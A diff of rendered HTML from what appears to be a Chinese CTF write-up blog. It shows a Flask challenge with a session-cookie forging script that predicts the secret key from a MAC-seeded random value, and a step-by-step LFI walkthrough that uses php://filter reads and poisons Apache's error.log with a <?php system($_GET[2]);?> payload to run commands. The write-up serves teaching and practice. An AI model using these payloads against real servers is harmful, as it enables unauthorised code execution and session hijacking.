+</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>
+</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/read'</span><span class="p">)</span>
+</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a><span class="k">def</span><span class="w"> </span><span class="nf">read</span><span class="p">():</span>
+</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
+</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a>        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a>        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21" href="#__codelineno-70-21"></a>        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
+</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22" href="#__codelineno-70-22"></a>            <span class="k">return</span> <span class="s1">'No Hack'</span>
+</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23" href="#__codelineno-70-23"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24" href="#__codelineno-70-24"></a>        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25" href="#__codelineno-70-25"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span><span id="__span-70-26"><a id="__codelineno-70-26" name="__codelineno-70-26" href="#__codelineno-70-26"></a>        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+</span><span id="__span-70-27"><a id="__codelineno-70-27" name="__codelineno-70-27" href="#__codelineno-70-27"></a>        <span class="k">return</span> <span class="s1">'no response'</span>
+</span><span id="__span-70-28"><a id="__codelineno-70-28" name="__codelineno-70-28" href="#__codelineno-70-28"></a>
+</span><span id="__span-70-29"><a id="__codelineno-70-29" name="__codelineno-70-29" href="#__codelineno-70-29"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span>
+</span><span id="__span-70-30"><a id="__codelineno-70-30" name="__codelineno-70-30" href="#__codelineno-70-30"></a><span class="k">def</span><span class="w"> </span><span class="nf">flag</span><span class="p">():</span>
+</span><span id="__span-70-31"><a id="__codelineno-70-31" name="__codelineno-70-31" href="#__codelineno-70-31"></a>    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'fuck'</span><span class="p">:</span>
+</span><span id="__span-70-32"><a id="__codelineno-70-32" name="__codelineno-70-32" href="#__codelineno-70-32"></a>        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/flag.txt'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-70-33"><a id="__codelineno-70-33" name="__codelineno-70-33" href="#__codelineno-70-33"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-70-34"><a id="__codelineno-70-34" name="__codelineno-70-34" href="#__codelineno-70-34"></a>        <span class="k">return</span> <span class="s1">'Access denied'</span>
+</span><span id="__span-70-35"><a id="__codelineno-70-35" name="__codelineno-70-35" href="#__codelineno-70-35"></a>
+</span><span id="__span-70-36"><a id="__codelineno-70-36" name="__codelineno-70-36" href="#__codelineno-70-36"></a><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">'__main__'</span><span class="p">:</span>
+</span><span id="__span-70-37"><a id="__codelineno-70-37" name="__codelineno-70-37" href="#__codelineno-70-37"></a>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">"0.0.0.0"</span><span class="p">)</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>本地脚本：算密钥 + 签 session</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c1"># 1) 算密钥（Python 3 里复现 Python 2 的行为）</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="n">mac</span> <span class="o">=</span> <span class="s1">'16:49:e9:36:04:ea'</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">mac</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="s1">''</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="n">key</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%.12g</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>      <span class="c1"># '34.5829013876'</span>
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
+</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="c1"># 2) 签 session（用 Flask 自己的签名器）</span>
+</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask.sessions</span><span class="w"> </span><span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
+</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>
+</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="k">class</span><span class="w"> </span><span class="nc">FakeApp</span><span class="p">:</span>
+</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
+</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">k</span>
+</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SECRET_KEY_FALLBACKS"</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>
+</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a>
+</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a><span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
+</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="n">signer</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">FakeApp</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a><span class="n">cookie</span> <span class="o">=</span> <span class="n">signer</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"fuck"</span><span class="p">})</span>
+</span><span id="__span-71-18"><a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a><span class="nb">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+</span></code></pre></div>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-01 11:00:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
@@ -5040,76 +5339,76 @@
 <p><strong>页面上按钮很多（新建、上传、回收站、已发布……），但除了预览，全是空壳。</strong></p>
 <p><strong>预览框输入文件名 → 前端发一个请求：</strong></p>
 <p><img alt="前端接口" src="../../../assets/images/pengxing-doc/02-js-fetch.png" /></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">'index.php?file='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">name</span><span class="p">),</span><span class="w"> </span><span class="p">{</span><span class="nx">method</span><span class="o">:</span><span class="s1">'GET'</span><span class="p">})</span>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">'index.php?file='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">name</span><span class="p">),</span><span class="w"> </span><span class="p">{</span><span class="nx">method</span><span class="o">:</span><span class="s1">'GET'</span><span class="p">})</span>
 </span></code></pre></div>
 <p><strong>接口是 <code>index.php?file=</code>，参数名 <code>file</code>。</strong></p>
 <h4 id="step-2-indexphp"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-2-indexphp">Step 2：直接看 index.php 看不到 —— 用伪协议读源码</a></h4>
 <p><strong><code>?file=index.php</code> 返回空 —— 因为 <code>include</code> 把它</strong>执行<strong>了，而不是打印。</strong></p>
 <p><strong>换成 base64 编码滤镜：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>?file=php://filter/convert.base64-encode/resource=index.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>?file=php://filter/convert.base64-encode/resource=index.php
 </span></code></pre></div>
 <p><strong>读到 2797 字节的源码。</strong>关键就在 <code>include</code> 和那条正则上。</p>
 <h4 id="step-3cmd"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-3cmd">Step 3：<code>cmd</code> 是个陷阱</a></h4>
 <p><img alt="WAF 与函数定义" src="../../../assets/images/pengxing-doc/03-waf-decoy.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="x">$WAF_PATTERN = '/(flag|cat|ls|\*|\?)/i';</span>
-</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>
-</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="x">function run_maintenance_command($command)</span>
-</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="x">{</span>
-</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="x">    return system($command);</span>
-</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="x">}</span>
-</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>
-</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="x">if (isset($_GET['cmd'])) {</span>
-</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a><span class="x">    $cmd = $_GET['cmd'];</span>
-</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a><span class="x">    if (preg_match($WAF_PATTERN, $cmd)) { echo "安全策略…"; exit; }</span>
-</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a><span class="x">    // 校验通过，命令参数将在文档内容渲染阶段被一并处理</span>
-</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">$WAF_PATTERN = '/(flag|cat|ls|\*|\?)/i';</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="x">function run_maintenance_command($command)</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="x">{</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="x">    return system($command);</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="x">}</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="x">if (isset($_GET['cmd'])) {</span>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="x">    $cmd = $_GET['cmd'];</span>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="x">    if (preg_match($WAF_PATTERN, $cmd)) { echo "安全策略…"; exit; }</span>
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a><span class="x">    // 校验通过，命令参数将在文档内容渲染阶段被一并处理</span>
+</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>第一眼看像是「命令执行 + WAF」，但拉下去看完整文件会发现：<code>run_maintenance_command()</code> <strong>只有定义，没有调用</strong>。</strong></p>
 <p><strong>注释自己也写着「Web 接口层不再直接触发」。</strong></p>
 <p><strong>WAF 保护的是一个什么都不做的空壳 —— 这个入口对我们没有任何实际作用。</strong></p>
 <h4 id="step-4-include"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-4-include">Step 4：真正的终点是 <code>include</code>，它过滤了目录穿越</a></h4>
 <p><img alt="文件分支" src="../../../assets/images/pengxing-doc/04-file-branch.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="x">$file = str_replace('../', '', $file);   // 剥一次</span>
-</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a><span class="x">$file = str_replace('..',  '', $file);   // 再剥一次</span>
-</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>
-</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="x">$is_stream = preg_match('#^[a-zA-Z0-9._+-]+://#', $file) === 1;</span>
-</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>
-</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a><span class="x">if ($is_stream)               { $target = $file; }</span>
-</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="x">elseif (file_exists($file))   { $target = $file; }</span>
-</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a><span class="x">elseif (file_exists('files/' . $file)) { $target = 'files/' . $file; }</span>
-</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>
-</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a><span class="x">if ($target === null) { echo "未找到指定的文档…"; exit; }</span>
-</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>
-</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a><span class="x">include($target);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="x">$file = str_replace('../', '', $file);   // 剥一次</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="x">$file = str_replace('..',  '', $file);   // 再剥一次</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="x">$is_stream = preg_match('#^[a-zA-Z0-9._+-]+://#', $file) === 1;</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="x">if ($is_stream)               { $target = $file; }</span>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="x">elseif (file_exists($file))   { $target = $file; }</span>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="x">elseif (file_exists('files/' . $file)) { $target = 'files/' . $file; }</span>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="x">if ($target === null) { echo "未找到指定的文档…"; exit; }</span>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a>
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="x">include($target);</span>
 </span></code></pre></div>
 <p><strong>两点：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>① ../ 被剥两次 → 相对穿越走不通（....// 这种双写也是死的）
-</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>② 但 file_exists($file) 对绝对路径直接为真 → 绝对路径完全可用
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>① ../ 被剥两次 → 相对穿越走不通（....// 这种双写也是死的）
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>② 但 file_exists($file) 对绝对路径直接为真 → 绝对路径完全可用
 </span></code></pre></div>
 <p><strong>而且 <code>include</code> 对文件类型的处理不一样：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>include 一个 txt  →  内容原样打印
-</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>include 一个 php  →  内容被当代码执行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>include 一个 txt  →  内容原样打印
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>include 一个 php  →  内容被当代码执行
 </span></code></pre></div>
 <h4 id="step-5"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-5">Step 5：确认日志路径</a></h4>
 <p><strong>先确认 Apache 还是 nginx 的日志能用：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>?file=/var/log/apache2/access.log      → 读不到
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>?file=/var/log/nginx/access.log        → 能读
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>?file=/var/log/apache2/access.log      → 读不到
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>?file=/var/log/nginx/access.log        → 能读
 </span></code></pre></div>
 <p><strong>但这里有个容易误判的地方 ——</strong>文件名写的是 <code>nginx</code>，日志内容却是 Apache 的<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>[Thu Oct 30 ...] [authz_core:error] [pid 23] [client ...]
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>[Thu Oct 30 ...] [authz_core:error] [pid 23] [client ...]
 </span></code></pre></div>
 <p><strong><code>authz_core</code> 是 Apache 模块，响应头也写着 <code>Server: Apache/2.4.54 (Debian)</code>。所以文件名只是路径巧合，服务端是 Apache。</strong></p>
 <h4 id="step-6accesslog-500-errorlog"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-6accesslog-500-errorlog">Step 6：access.log 突然 500，只能换 error.log</a></h4>
 <p><strong>一开始对 <code>access.log</code> 用得挺好，后来就一直是 500 —— 原因是</strong>别人先注入了一条写坏的 payload<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>script '/var/www/html/&lt;?php eval($_GET['1'];?&gt;.php' not found
-</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>                                      └─ 少一个 )，Parse error
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>script '/var/www/html/&lt;?php eval($_GET['1'];?&gt;.php' not found
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>                                      └─ 少一个 )，Parse error
 </span></code></pre></div>
 <p><strong>一行的语法错误，就能让整份日志作废（include 时直接 500）。</strong></p>
 <p><strong>所以换 <code>error.log</code> —— 它短、干净。</strong></p>
 <h4 id="step-7-errorlog"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-7-errorlog">Step 7：往 error.log 里注入</a></h4>
 <p><strong>关键：<code>error.log</code> 里那条 <code>script '...' not found</code> 是</strong>mod_php 找不到脚本<strong>时才写的 —— 只有路径</strong>以 <code>.php</code> 结尾<strong>才会产生。</strong></p>
 <p><strong>构造：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php
 </span></code></pre></div>
 <p><strong>三个要点：</strong></p>
 <table>
@@ -5136,61 +5435,61 @@
 </table>
 <h4 id="step-8"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-8">Step 8：先确认，再执行</a></h4>
 <p><strong>注入完</strong>不要直接 include<strong>，先用滤镜把日志读出来核对（不执行）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>?file=php://filter/convert.base64-encode/resource=/var/log/nginx/error.log
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>?file=php://filter/convert.base64-encode/resource=/var/log/nginx/error.log
 </span></code></pre></div>
 <p><strong>能看到完整的一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>script '/var/www/html/&lt;?php system($_GET[2]);?&gt;.php' not found or unable to stat
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>script '/var/www/html/&lt;?php system($_GET[2]);?&gt;.php' not found or unable to stat
 </span></code></pre></div>
 <p><strong>确认无误，再执行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>?file=/var/log/nginx/error.log&amp;2=ls -la /
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>?file=/var/log/nginx/error.log&amp;2=ls -la /
 </span></code></pre></div>
 <h4 id="step-9php"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-9php">Step 9：<code>/.php</code> 不是被截断，是被执行了</a></h4>
 <p><strong>第一次 include 日志时，看到的是这样：</strong></p>
 <p><img alt="看起来像被截断" src="../../../assets/images/pengxing-doc/05-log-executed.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>script '/var/www/html/.php' not found
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>script '/var/www/html/.php' not found
 </span></code></pre></div>
 <p><strong>我一开始以为是 payload 被截断了，其实</strong>中间那一截是被 include 执行掉了<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>文本:  script '/var/www/html/
-</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>代码:  &lt;?php system($_GET[2]);?&gt;      ← 执行，不产生输出
-</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>文本:  .php' not found or unable to stat
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>文本:  script '/var/www/html/
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>代码:  &lt;?php system($_GET[2]);?&gt;      ← 执行，不产生输出
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>文本:  .php' not found or unable to stat
 </span></code></pre></div>
